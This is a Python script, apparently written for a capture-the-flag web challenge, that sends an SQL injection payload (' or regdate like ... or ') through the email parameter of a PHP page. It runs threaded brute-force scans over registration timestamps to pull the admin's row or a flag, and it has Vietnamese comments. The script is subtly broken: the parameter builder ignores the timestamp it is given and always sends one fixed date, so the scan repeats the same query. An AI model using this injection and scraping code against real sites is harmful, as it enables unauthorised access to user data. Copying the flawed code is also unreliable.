import re, requests, datetime as dt
from concurrent.futures import ThreadPoolExecutor, as_completed

FLAG_RE = re.compile(r"(FLAG|DH|BISC)[A-Za-z0-9_]*\{[^}]+\}", re.I)

class HyaxBruter:
    def __init__(self, base_url, username_value="zzz", guest_user="guest1",
                 guest_email=None, guest_comment=None, timeout=6, workers=16):
        self.base = base_url.rstrip("/")
        self.uval = username_value
        self.guest_user = guest_user
        self.guest_email = guest_email
        self.guest_comment = guest_comment
        self.s = requests.Session()
        self.timeout = timeout
        self.workers = workers

    def _params(self, ts14):
        return {"username": self.uval, "email": f"' or regdate like '20210203232342' or '"}

    def _parse_row(self, html):
        cells = re.findall(r"<td[^>]*>(.*?)</td>", html, flags=re.S|re.I)
        if len(cells) < 4: return None
        clean = lambda x: re.sub(r"<.*?>", "", x, flags=re.S).strip()
        return {"user": clean(cells[0]), "email": clean(cells[1]),
                "comment": clean(cells[2]), "regdate": clean(cells[3])}

    def fetch(self, ts14):
        r = self.s.get(self.base, params=self._params(ts14), timeout=self.timeout)
        row = self._parse_row(r.text)
        return ts14, row

    def is_guest(self, row):
        if row["user"] == self.guest_user: return True
        if self.guest_email and row["email"] == self.guest_email: return True
        if self.guest_comment and row["comment"] == self.guest_comment: return True
        return False

    def is_adminish(self, row):
        if not row: return False
        if row["user"].lower() == "admin": return True
        if FLAG_RE.search(row["comment"]): return True
        return not self.is_guest(row)  # khác guest ⇒ nhiều khả năng là admin

    def brute_around(self, seed_ts14, window_secs=900, prefer_backward=True):
        center = dt.datetime.strptime(seed_ts14, "%Y%m%d%H%M%S")
        # tạo list TS theo thứ tự 0, -1, +1, -2, +2, ...
        offsets = [0]
        for i in range(1, window_secs+1):
            offsets += ([-i, i] if prefer_backward else [i, -i])
        ts_list = [(center + dt.timedelta(seconds=o)).strftime("%Y%m%d%H%M%S") for o in offsets]

        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = [ex.submit(self.fetch, ts) for ts in ts_list]
            for f in as_completed(futs):
                ts, row = f.result()
                if row and self.is_adminish(row):
                    return ts, row
        return None, None

    def brute_day(self, day_yyyymmdd):
        start = dt.datetime.strptime(day_yyyymmdd, "%Y%m%d")
        ts_list = [(start + dt.timedelta(seconds=i)).strftime("%Y%m%d%H%M%S")
                   for i in range(86400)]
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = [ex.submit(self.fetch, ts) for ts in ts_list]
            for f in as_completed(futs):
                ts, row = f.result()
                if row and self.is_adminish(row):
                    return ts, row
        return None, None

# ---- dùng nhanh ----
if __name__ == "__main__":
    BASE = "http://127.0.0.1:8000/home.php"  # đổi host của bạn
    SEED = "20210203232343"  # mốc bạn quan sát được ở guest1

    b = HyaxBruter(BASE, username_value="zzz", guest_user="guest1",
                   guest_comment="hi my name is me2nuk", workers=24)

    ts, row = b.brute_around(SEED, window_secs=1800)  # ±30 phút
    if not row:
        # nếu chưa trúng, quét cả ngày 20210203
        ts, row = b.brute_day(SEED[:8])

    if row:
        print("[HIT]", ts)
        print("USER   :", row["user"])
        print("EMAIL  :", row["email"])
        print("COMMENT:", row["comment"])
        print("DATE   :", row["regdate"])
    else:
        print("Không tìm thấy trong cửa sổ/ngày đã quét.")
